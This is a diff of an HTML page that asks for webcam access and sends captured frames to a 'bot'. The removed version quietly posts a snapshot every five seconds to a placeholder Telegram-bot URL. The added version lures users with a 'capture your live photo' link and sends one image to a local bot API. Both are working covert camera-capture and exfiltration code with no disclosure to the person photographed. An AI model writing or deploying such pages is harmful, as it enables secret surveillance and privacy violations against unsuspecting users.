@@ -1,42 +1,60 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Camera Access</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Photo Capture</title>
 </head>
 <body>
-  <h1>Camera Access</h1>
-  <button id="start-btn">Start Camera</button>
-  <video id="video" width="640" height="480"></video>
-  <script>
-    const startBtn = document.getElementById('start-btn');
-    const video = document.getElementById('video');
-    startBtn.addEventListener('click', async () => {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        sendPhotos(stream); 
-      } catch (err) {
-        console.error(err);
-      }
-    });
-    function sendPhotos(stream) {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      setInterval(() => {
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        const photo = canvas.toDataURL();
-        fetch('https://apna-telegram-bot-url.com/photo', { 
-          method: 'POST',
-          body: JSON.stringify({ photo }),
-          headers: { 'Content-Type': 'application/json' }
-        });
-      }, 5000); 
-    }
-  </script>
+    <h2>Click the link to capture your live photo!</h2>
+    <a href="#" onclick="startCamera()">Capture Live Photo</a>
+
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // Function to start camera when user clicks the link
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function (stream) {
+                    // Display live video feed
+                    document.getElementById('video').style.display = 'block';
+                    document.getElementById('video').srcObject = stream;
+                    // Once permission is granted, capture photo
+                    setTimeout(() => {
+                        capturePhoto();
+                    }, 3000); // Capture after 3 seconds (for example)
+                })
+                .catch(function (error) {
+                    alert('Camera access denied!');
+                });
+        }
+
+        // Function to capture photo and send to bot
+        function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataUrl = canvas.toDataURL('image/png');
+            sendToBot(dataUrl);
+        }
+
+        // Send the captured image to the backend (your bot's API)
+        function sendToBot(imageDataUrl) {
+            fetch('http://localhost:3000', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ image: imageDataUrl })
+            })
+            .then(response => response.json())
+            .then(data => console.log('Photo sent to bot:', data))
+            .catch(error => console.error('Error:', error));
+        }
+    </script>
 </body>
 </html>
- 
